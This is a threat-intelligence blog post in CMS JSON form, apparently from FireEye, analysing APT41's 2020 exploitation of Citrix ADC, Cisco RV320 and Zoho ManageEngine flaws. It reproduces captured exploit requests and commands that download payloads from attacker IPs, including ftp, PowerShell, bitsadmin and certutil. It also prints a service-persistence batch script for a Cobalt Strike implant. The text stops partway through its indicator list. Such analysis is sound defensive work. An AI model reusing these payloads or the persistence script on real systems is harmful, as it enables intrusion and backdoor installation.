{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "fireeye_global_admin",
  "jcr:created": "Wed Mar 25 2020 12:00:01 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "fireeye_global_admin",
    "jcr:title": "This Is\u00a0Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits",
    "jcr:versionHistory": "eb383996-6710-43af-a224-0f10b058b0e3",
    "author": "Christopher Glyer",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "1d28515d-aa21-4aba-9dd0-f34b90d7871e"
    ],
    "jcr:created": "Fri Jul 24 2020 07:20:30 GMT+0000",
    "cq:lastModified": "Fri Jul 24 2020 07:20:13 GMT+0000",
    "jcr:baseVersion": "1d28515d-aa21-4aba-9dd0-f34b90d7871e",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:cap-christopher-glyer",
      "fireeye-blog-authors:dan-perez",
      "fireeye-blog-authors:sarah-jones",
      "fireeye-blog-authors:cap-steve-miller",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:apt",
      "fireeye-blog-tags:china",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:vulnerabilities"
    ],
    "jcr:uuid": "e93efb40-f2dc-4c82-b4e2-39d290109eb8",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Wed Mar 25 2020 08:00:00 GMT-0400",
    "cq:lastModifiedBy": "reference-adjustment-service",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Cp\u003EBeginning this year, FireEye observed \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/content.fireeye.com\/apt-41\/rpt-apt41\/\u0022\u003EChinese actor APT41\u003C\/a\u003E carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2019\/08\/game-over-detecting-and-stopping-an-apt41-operation.html\u0022 adhocenable=\u0022false\u0022\u003EAPT41\u003C\/a\u003E attempt to exploit vulnerabilities in\u0026nbsp;\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2019-19781\u0022\u003ECitrix NetScaler\/ADC\u003C\/a\u003E, Cisco routers, and \u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2020-10189\u0022\u003EZoho ManageEngine Desktop Central\u003C\/a\u003E at over 75 FireEye customers. Countries we\u2019ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA. The following industries were targeted: Banking\/Finance, Construction, Defense Industrial Base, Government, Healthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil \u0026amp; Gas, Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It\u2019s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature.\u003C\/p\u003E\n\u003Ch4\u003EExploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC])\u003C\/h4\u003E\n\u003Cp\u003EStarting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery Controller (ADC) and Citrix Gateway devices with \u003Ca href=\u0022https:\/\/support.citrix.com\/article\/CTX267027\u0022\u003ECVE-2019-19781\u003C\/a\u003E (published December 17, 2019).\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/apt41exploits\/apt41-timeline-blog-v2.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Timeline of key events\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command \u2018file \/bin\/pwd\u2019, which may have achieved two objectives for APT41. First, it would confirm whether the system was vulnerable and the \u003Ca href=\u0022https:\/\/support.citrix.com\/article\/CTX267679\u0022\u003Emitigation\u003C\/a\u003E wasn\u2019t applied. Second, it may return architecture-related information that would be required knowledge for APT41 to successfully deploy a backdoor in a follow-up step.\u0026nbsp;\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EOne interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41 was operating with an already-known list of identified devices accessible on the internet.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EPOST \/vpns\/portal\/scripts\/newbm.pl HTTP\/1.1\u003Cbr\u003E\nHost: [redacted]\u003Cbr\u003E\nConnection: close\u003Cbr\u003E\nAccept-Encoding: gzip, deflate\u003Cbr\u003E\nAccept: *\/*\u003Cbr\u003E\nUser-Agent: python-requests\/2.22.0\u003Cbr\u003E\nNSC_NONCE: nsroot\u003Cbr\u003E\nNSC_USER: ..\/..\/..\/netscaler\/portal\/templates\/[redacted]\u003Cbr\u003E\nContent-Length: 96\u003Cbr\u003E\n\u003Cbr\u003E\nurl=http:\/\/example.com\u0026amp;title=[redacted]\u0026amp;desc=[% template.new(\u0027BLOCK\u0027 = \u0027print `file \/bin\/pwd`\u0027) %]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThere is a lull in APT41 activity between January 23 and February 1, which is likely related to the Chinese Lunar New Year holidays which occurred between January 24 and January 30, 2020. This has been a common activity pattern by Chinese APT groups in past years as well.\u003C\/p\u003E\n\u003Cp\u003EStarting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the command \u2018\/usr\/bin\/ftp -o \/tmp\/bsd ftp:\/\/test:[redacted]\\@66.42.98[.]220\/bsd\u2019, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of \u2018test\u2019 and a password that we have redacted, and then downloaded an unknown payload named \u2018bsd\u2019 (which was likely a backdoor).\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EPOST \/vpn\/..\/vpns\/portal\/scripts\/newbm.pl HTTP\/1.1\u003Cbr\u003E\nAccept-Encoding: identity\u003Cbr\u003E\nContent-Length: 147\u003Cbr\u003E\nConnection: close\u003Cbr\u003E\nNsc_User: ..\/..\/..\/netscaler\/portal\/templates\/[redacted]\u003Cbr\u003E\nUser-Agent: Python-urllib\/2.7\u003Cbr\u003E\nNsc_Nonce: nsroot\u003Cbr\u003E\nHost: [redacted]\u003Cbr\u003E\nContent-Type: application\/x-www-form-urlencoded\u003Cbr\u003E\n\u003Cbr\u003E\nurl=http:\/\/example.com\u0026amp;title=[redacted]\u0026amp;desc=[% template.new(\u0027BLOCK\u0027 = \u0027\u003Cb\u003Eprint `\/usr\/bin\/ftp -o \/tmp\/bsd ftp:\/\/test:[redacted]\\@66.42.98[.]220\/bsd\u003C\/b\u003E`\u0027) %]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EWe did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated COVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out quarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019-19781 exploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1, where only the name of the payload \u2018un\u2019 changed.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EPOST \/vpn\/..\/vpns\/portal\/scripts\/newbm.pl HTTP\/1.1\u003Cbr\u003E\nAccept-Encoding: identity\u003Cbr\u003E\nContent-Length: 145\u003Cbr\u003E\nConnection: close\u003Cbr\u003E\nNsc_User: ..\/..\/..\/netscaler\/portal\/templates\/[redacted]\u003Cbr\u003E\nUser-Agent: Python-urllib\/2.7\u003Cbr\u003E\nNsc_Nonce: nsroot\u003Cbr\u003E\nHost: [redacted]\u003Cbr\u003E\nContent-Type: application\/x-www-form-urlencoded\u003Cbr\u003E\n\u003Cbr\u003E\nurl=http:\/\/example.com\u0026amp;title= [redacted]\u0026amp;desc=[% template.new(\u0027BLOCK\u0027 = \u0027\u003Cb\u003Eprint `\/usr\/bin\/ftp -o \/tmp\/un ftp:\/\/test:[redacted]\\@66.42.98[.]220\/un\u003C\/b\u003E`\u0027) %]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: Example APT41 HTTP traffic exploiting CVE-2019-19781\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ECitrix released a \u003Ca href=\u0022https:\/\/support.citrix.com\/article\/CTX267027\u0022\u003Emitigation\u003C\/a\u003E for CVE-2019-19781 on December 17, 2019, and as of January 24, 2020, released permanent fixes for all supported versions of Citrix ADC, Gateway, and SD-WAN WANOP.\u003C\/p\u003E\n\u003Ch4\u003ECisco Router Exploitation\u003C\/h4\u003E\n\u003Cp\u003EOn February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named \u2018fuc\u2019 (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module that combines two CVE\u2019s (\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2019-1653\u0022\u003ECVE-2019-1653\u003C\/a\u003E and \u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2019-1652\u0022\u003ECVE-2019-1652\u003C\/a\u003E) to \u003Ca href=\u0022https:\/\/www.rapid7.com\/db\/modules\/exploit\/linux\/http\/cisco_rv32x_rce\u0022\u003Eenable remote code execution\u0026nbsp;on Cisco RV320 and RV325\u003C\/a\u003E small business routers and uses wget to download the specified payload.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EGET \/test\/fuc\u003Cbr\u003E\nHTTP\/1.1\u003Cbr\u003E\nHost: 66.42.98\\.220\u003Cbr\u003E\nUser-Agent: Wget\u003Cbr\u003E\nConnection: close\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E66.42.98[.]220 also hosted a file name http:\/\/66.42.98[.]220\/test\/1.txt. The content of 1.txt (MD5: \u0026nbsp;c0c467c8e9b2046d7053642cc9bdd57d) is \u2018cat \/etc\/flash\/etc\/nk_sysconfig\u2019, which is the command one would execute on a Cisco RV320 router to display the current configuration.\u003C\/p\u003E\n\u003Cp\u003ECisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/tools.cisco.com\/security\/center\/content\/CiscoSecurityAdvisory\/cisco-sa-20190123-rv-info\u0022\u003ECisco Small Business RV320 and RV325 Routers Information Disclosure Vulnerability\u003C\/a\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/tools.cisco.com\/security\/center\/content\/CiscoSecurityAdvisory\/cisco-sa-20190123-rv-inject\u0022\u003ECisco Small Business RV320 and RV325 Routers Command Injection Vulnerability\u003C\/a\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EExploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)\u003C\/h4\u003E\n\u003Cp\u003EOn March 5, 2020, researcher\u0026nbsp;\u003Ca href=\u0022https:\/\/twitter.com\/steventseeley\/status\/1235635108498948096?s=20\u0022\u003ESteven Seeley\u003C\/a\u003E, published \u003Ca href=\u0022https:\/\/srcincite.io\/advisories\/src-2020-0011\/\u0022\u003Ean advisory\u003C\/a\u003E and released\u0026nbsp;\u003Ca href=\u0022https:\/\/srcincite.io\/pocs\/src-2020-0011.py.txt\u0022\u003Eproof-of-concept code\u003C\/a\u003E for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (\u003Ca href=\u0022https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2020-10189\u0022\u003ECVE-2020-10189)\u003C\/a\u003E. Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload \u201clogger.zip\u201d, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003Ejava\/lang\/Runtime\u003C\/p\u003E\n\u003Cp\u003EgetRuntime\u003C\/p\u003E\n\u003Cp\u003E()Ljava\/lang\/Runtime;\u003C\/p\u003E\n\u003Cp\u003EXcmd \/c powershell $client = new-object System.Net.WebClient;$client.DownloadFile(\u0027http:\/\/66.42.98[.]220:12345\/test\/install.bat\u0027,\u0027C:\\\u003Cbr\u003E\nWindows\\Temp\\install.bat\u0027)\u0026amp;powershell $client = new-object System.Net.WebClient;$client.DownloadFile(\u0027http:\/\/66.42.98[.]220:12345\/test\/storesyncsvc.dll\u0027,\u0027\u003Cbr\u003E\nC:\\Windows\\Temp\\storesyncsvc.dll\u0027)\u0026amp;C:\\Windows\\Temp\\install.bat\u003C\/p\u003E\n\u003Cp\u003E\u0027(Ljava\/lang\/String;)Ljava\/lang\/Process;\u003C\/p\u003E\n\u003Cp\u003EStackMapTable\u003C\/p\u003E\n\u003Cp\u003Eysoserial\/Pwner76328858520609\u003C\/p\u003E\n\u003Cp\u003ELysoserial\/Pwner76328858520609;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: Contents of logger.zip\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EHere we see a toolmark from the tool \u003Ca href=\u0022https:\/\/github.com\/frohoff\/ysoserial\u0022\u003Eysoserial\u003C\/a\u003E that was used to create the payload in the POC. The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation.\u003C\/p\u003E\n\u003Cp\u003EIn the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EParent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe\u003C\/p\u003E\n\u003Cp\u003EProcess Arguments: cmd \/c bitsadmin \/transfer bbbb http:\/\/66.42.98[.]220:12345\/test\/install.bat C:\\Users\\Public\\install.bat\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: Example FireEye Endpoint Security event depicting successful CVE-2020-10189 exploitation\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EIn both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON loader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E@echo off\u003C\/p\u003E\n\u003Cp\u003Eset \u0026quot;WORK_DIR=C:\\Windows\\System32\u0026quot;\u003C\/p\u003E\n\u003Cp\u003Eset \u0026quot;DLL_NAME=storesyncsvc.dll\u0026quot;\u003C\/p\u003E\n\u003Cp\u003Eset \u0026quot;SERVICE_NAME=StorSyncSvc\u0026quot;\u003C\/p\u003E\n\u003Cp\u003Eset \u0026quot;DISPLAY_NAME=Storage Sync Service\u0026quot;\u003C\/p\u003E\n\u003Cp\u003Eset \u0026quot;DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync. It creates sync relationships with multiple storage accounts via multiple sync groups. If this service is stopped or disabled, applications will be unable to run collectly.\u0026quot;\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;sc stop %SERVICE_NAME%\u003C\/p\u003E\n\u003Cp\u003Esc delete %SERVICE_NAME%\u003C\/p\u003E\n\u003Cp\u003Emkdir %WORK_DIR%\u003C\/p\u003E\n\u003Cp\u003Ecopy \u0026quot;%~dp0%DLL_NAME%\u0026quot; \u0026quot;%WORK_DIR%\u0026quot; \/Y\u003C\/p\u003E\n\u003Cp\u003Ereg add \u0026quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\u0026quot; \/v \u0026quot;%SERVICE_NAME%\u0026quot; \/t REG_MULTI_SZ \/d \u0026quot;%SERVICE_NAME%\u0026quot; \/f\u003C\/p\u003E\n\u003Cp\u003Esc create \u0026quot;%SERVICE_NAME%\u0026quot; binPath= \u0026quot;%SystemRoot%\\system32\\svchost.exe -k %SERVICE_NAME%\u0026quot; type= share start= auto error= ignore DisplayName= \u0026quot;%DISPLAY_NAME%\u0026quot;\u003C\/p\u003E\n\u003Cp\u003ESC failure \u0026quot;%SERVICE_NAME%\u0026quot; reset= 86400 actions= restart\/60000\/restart\/60000\/restart\/60000\u003C\/p\u003E\n\u003Cp\u003Esc description \u0026quot;%SERVICE_NAME%\u0026quot; \u0026quot;%DESCRIPTION%\u0026quot;\u003C\/p\u003E\n\u003Cp\u003Ereg add \u0026quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\u0026quot; \/f\u003C\/p\u003E\n\u003Cp\u003Ereg add \u0026quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\u0026quot; \/v \u0026quot;ServiceDll\u0026quot; \/t REG_EXPAND_SZ \/d \u0026quot;%WORK_DIR%\\%DLL_NAME%\u0026quot; \/f\u003C\/p\u003E\n\u003Cp\u003Enet start \u0026quot;%SERVICE_NAME%\u0026quot;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Contents of install.bat\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EStoresyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EGET \/jquery-3.3.1.min.js HTTP\/1.1\u003Cbr\u003E\nHost: cdn.bootcss.com\u003Cbr\u003E\nAccept: text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8\u003Cbr\u003E\nReferer: http:\/\/cdn.bootcss.com\/\u003Cbr\u003E\nAccept-Encoding: gzip, deflate\u003Cbr\u003E\nCookie: __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRMpJawYvnAhPJYM\u003Cbr\u003E\nDA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZfu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLI\u003Cbr\u003E\nUser-Agent: Mozilla\/5.0 (Windows NT 6.3; Trident\/7.0; rv:11.0) like Gecko\u003Cbr\u003E\nConnection: Keep-Alive Cache-Control: no-cache\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: Example APT41 Cobalt Strike BEACON jquery malleable C2 profile HTTP request\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EWithin a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2019\/08\/game-over-detecting-and-stopping-an-apt41-operation.html\u0022\u003ETTP that we\u2019ve observed APT41 use in past intrusions\u003C\/a\u003E, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2019\/10\/lowkey-hunting-for-the-missing-volume-serial-id.html\u0022\u003Eusage of VMProtected binaries\u003C\/a\u003E is another very common TTP that we\u2019ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EGET \/2.exe HTTP\/1.1\u003Cbr\u003E\nCache-Control: no-cache\u003Cbr\u003E\nConnection: Keep-Alive\u003Cbr\u003E\nPragma: no-cache\u003Cbr\u003E\nAccept: *\/*\u003Cbr\u003E\nUser-Agent: Microsoft-CryptoAPI\/6.3\u003Cbr\u003E\nHost: 91.208.184[.]78\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 10: Example HTTP request downloading \u20182.exe\u2019 VMProtected Meterpreter downloader via CertUtil\u003C\/span\u003E\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003Ecertutil\u0026nbsp; -urlcache -split -f http:\/\/91.208.184[.]78\/2.exe\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 11: Example CertUtil command to download \u20182.exe\u2019 VMProtected Meterpreter downloader\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe Meterpreter downloader \u2018TzGG\u2019 was configured to communicate with 91.208.184[.]78 over port 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003EGET \/TzGG HTTP\/1.1\u003Cbr\u003E\nUser-Agent: Mozilla\/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident\/4.0)\u003Cbr\u003E\nHost: 91.208.184[.]78:443\u003Cbr\u003E\nConnection: Keep-Alive\u003Cbr\u003E\nCache-Control: no-cache\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 12: Example HTTP request downloading \u2018TzGG\u2019 shellcode for Cobalt Strike BEACON\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. We believe this is an example of the actor attempting to diversify post-exploitation access to the compromised systems.\u003C\/p\u003E\n\u003Cp\u003EManageEngine released a short term \u003Ca href=\u0022https:\/\/www.manageengine.com\/products\/desktop-central\/remote-code-execution-vulnerability.html\u0022\u003Emitigation\u003C\/a\u003E for CVE-2020-10189 on January 20, 2020, and subsequently released an \u003Ca href=\u0022https:\/\/www.manageengine.com\/products\/desktop-central\/rce-vulnerability-cve-2020-10189.html?utm_source=rce-kb\u0022\u003Eupdate\u003C\/a\u003E on March 7, 2020, with a long term fix.\u003C\/p\u003E\n\u003Ch4\u003EOutlook\u003C\/h4\u003E\n\u003Cp\u003EThis activity is one of the most widespread campaigns we have seen from China-nexus espionage actors in recent years. While APT41 has previously conducted activity with an extensive initial entry such as the trojanizing of NetSarang software, this scanning and exploitation \u003Cu\u003Ehas focused on a subset of our customers\u003C\/u\u003E, and seems to reveal a high operational tempo and wide collection requirements for APT41.\u003C\/p\u003E\n\u003Cp\u003EIt is notable that we have only seen these exploitation attempts leverage publicly available malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in previous incidents APT41 has waited to deploy more advanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage.\u003C\/p\u003E\n\u003Cp\u003EPreviously, \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/mandiant\/managed-detection-and-response.html\u0022\u003EFireEye Mandiant Managed Defense\u003C\/a\u003E identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a \u003Ca href=\u0022https:\/\/content.fireeye.com\/apt-41\/rpt-apt41\/\u0022\u003Eunique\u003C\/a\u003E state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain.\u003C\/p\u003E\n\u003Ch4\u003EIndicators\u003C\/h4\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EType\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EIndicator(s)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECVE-2019-19781 Exploitation (Citrix Application Delivery Control)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E66.42.98[.]220\u003C\/p\u003E\n\u003Cp\u003ECVE-2019-19781 exploitation attempts with a payload of \u2018file \/bin\/pwd\u2019\u003C\/p\u003E\n\u003Cp\u003ECVE-2019-19781 exploitation attempts with a payload of \u2018\/usr\/bin\/ftp -o \/tmp\/un ftp:\/\/test:[redacted]\\@66.42.98[.]220\/bsd\u2019\u003C\/p\u003E\n\u003Cp\u003ECVE-2019-19781 exploitation attempts with a payload of \u2018\/usr\/bin\/ftp -o \/tmp\/un ftp:\/\/test:[redacted]\\@66.42.98[.]220\/un\u2019\u003C\/p\u003E\n\u003Cp\u003E\/tmp\/bsd\u003C\/p\u003E\n\u003Cp\u003E\/tmp\/un\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECisco Router Exploitation\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022312\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E66.42.98\\.220\u003C\/p\u003E\n\u003Cp\u003E\u20181.txt\u2019 (MD5: 